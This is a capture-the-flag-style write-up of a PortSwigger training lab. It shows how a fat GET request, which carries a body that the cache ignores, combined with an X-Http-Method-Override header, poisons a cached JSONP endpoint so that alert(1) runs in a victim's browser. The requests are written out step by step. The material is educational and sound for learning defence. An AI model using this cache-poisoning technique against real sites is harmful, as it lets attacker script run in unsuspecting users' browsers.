
# Web cache poisoning via a fat GET request

This lab is vulnerable to web cache poisoning. It accepts GET requests that have a body, but does not include the body in the cache key. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser.


---------------------------------------------

References: 

- https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws



![img](images/Web%20cache%20poisoning%20via%20a%20fat%20GET%20request/1.png)

---------------------------------------------

We can find the “Origin” header can work as oracle and random query parameters are keyed:

```
GET /?test=ing123 HTTP/2
...
Pragma: x-get-cache-key
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.0afc006103e7279e80ff71c000b0005c.web-security-academy.net
```



![img](images/Web%20cache%20poisoning%20via%20a%20fat%20GET%20request/2.png)


Just like the previous lab, we find a request to “/js/geolocate.js?callback=setCountryCookie” from the home page:



![img](images/Web%20cache%20poisoning%20via%20a%20fat%20GET%20request/3.png)


First we will send the payload with the “Origin” header. We have to add the “X-Http-Method-Override” header so the “alert(1)” gets cached:

```
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
...
Origin: https://cachebuster.0afc006103e7279e80ff71c000b0005c.web-security-academy.net
X-Http-Method-Override: POST
Content-Length: 17

callback=alert(1)
```



![img](images/Web%20cache%20poisoning%20via%20a%20fat%20GET%20request/4.png)


Then we check with the “Origin” header and a regular GET request:



![img](images/Web%20cache%20poisoning%20via%20a%20fat%20GET%20request/5.png)


Then we poison the endpoint without the “Origin” header:



![img](images/Web%20cache%20poisoning%20via%20a%20fat%20GET%20request/6.png)


And check with a regular GET request without the “Origin” header:



![img](images/Web%20cache%20poisoning%20via%20a%20fat%20GET%20request/7.png)


Then access “/” and the request to this endpoint generates the alert message:



![img](images/Web%20cache%20poisoning%20via%20a%20fat%20GET%20request/8.png)